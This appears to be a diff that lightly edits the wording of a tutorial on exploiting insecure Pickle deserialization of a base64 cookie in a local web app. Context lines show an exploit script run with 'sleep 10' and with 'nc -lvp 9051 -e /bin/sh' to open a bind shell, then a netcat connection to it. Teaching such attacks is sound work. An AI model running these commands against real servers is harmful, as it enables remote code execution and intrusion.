@@ -40,7 +40,7 @@ After decoding the cookie, which is in base64, the following structure was found
 
 <img src="attack6.png" align="center"/>
 
-The structure found is very similar to the ones created with the function [Pickle]. We can be certain of that by having a look at the app's [code][3]. The hint is now confirmed, the app uses Pickle, as we can see from the image below:
+The structure found is very similar to the ones created with the [Pickle] function. We can be certain of that by having a look at the app's [code][3]. The hint is now confirmed, the app uses Pickle, as we can see from the image below:
 
 
 <img src="attack7.png" align="center"/>
@@ -87,7 +87,7 @@ $ python serializaPickle.py "sleep 10" http://localhost:5000/user
 
 <img src="attack9.png" align="center"/>
 
-In order to show how an attacker could have access to the server through an RCE, we will use the code depicted on the image below to create a bind shell on the server on the 9051 port.
+In order to show how an attacker could have access to the server through a RCE, we will use the code depicted on the image below to create a bind shell on the server's 9051 port.
 
 ```sh
 $ python serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
@@ -95,7 +95,7 @@ $ python serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:5000/user
 
 <img src="attack10.png" align="center"/>
 
-The code used above creates bind shell on the server's port 9051, which is then listening for incoming connections. After that, the attacker can connect to that port using a simple [netcat] command, as show below:
+The code used above creates a bind shell on the server's port 9051, which is then listening for incoming connections. After that, the attacker can connect to that port using a simple [netcat] command, as shown below:
 
 ```sh
 $ nc localhost 9051
